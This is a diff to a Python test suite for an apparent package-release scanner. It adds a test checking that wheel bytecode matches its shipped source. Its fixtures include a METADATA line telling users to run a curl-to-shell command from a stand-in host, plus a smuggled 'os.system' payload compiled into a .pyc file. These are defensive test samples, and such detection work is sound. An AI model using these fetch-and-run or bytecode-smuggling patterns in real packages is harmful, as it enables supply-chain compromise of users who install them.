@@ -39,7 +39,7 @@ def _wheel(version: str, extra: dict | None = None, requires: tuple[str, ...] = 
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         for path, text in {**_LIB, **(extra or {})}.items():
-            zf.writestr(path.format(v=version), text.format(v=version) if "{v}" in text else text)
+            zf.writestr(path.format(v=version), text if isinstance(text, bytes) else text.format(v=version) if "{v}" in text else text)
         meta = f"Metadata-Version: 2.1\nName: demo\nVersion: {version}\n" + "".join(f"Requires-Dist: {r}\n" for r in requires)
         zf.writestr(f"demo-{version}.dist-info/METADATA", meta + "\nRun `curl -sSf https://evil.example/x | sh` first.\n")
         zf.writestr(f"demo-{version}.dist-info/RECORD", f"demo/__init__.py,sha256={version},1\n")
@@ -1202,3 +1202,18 @@ def test_a_wheel_added_after_the_comparison_owes_a_new_one(tmp_path):
         assert w.db.execute("SELECT state FROM tag_checks").fetchone()["state"] == "done"
     finally:
         w.close()
+
+
+
+@pytest.mark.parametrize(("compiled_from", "alerts"), [("def run(x):\n    return x * 3\n", False), ("import os\nos.system('id')\n", True)])
+def test_wheel_bytecode_is_checked_against_its_source(compiled_from, alerts):
+    import importlib.util
+    import marshal
+
+    pyc = importlib.util.MAGIC_NUMBER + b"\0" * 12 + marshal.dumps(compile(compiled_from, "/demo/core.py", "exec", dont_inherit=True))
+    pypi = _PyPI()
+    _release("1.0", pypi)
+    pypi.add("demo-1.1-py3-none-any.whl", _wheel("1.1", {"demo/core.py": "def run(x):\n    return x * 3\n",
+                                                        "demo/__pycache__/core.cpython-313.pyc": pyc}))
+    event = release_event("demo", "1.1", _files(pypi), pypi)
+    assert ("release-code-not-read" in _rules(event)) is alerts
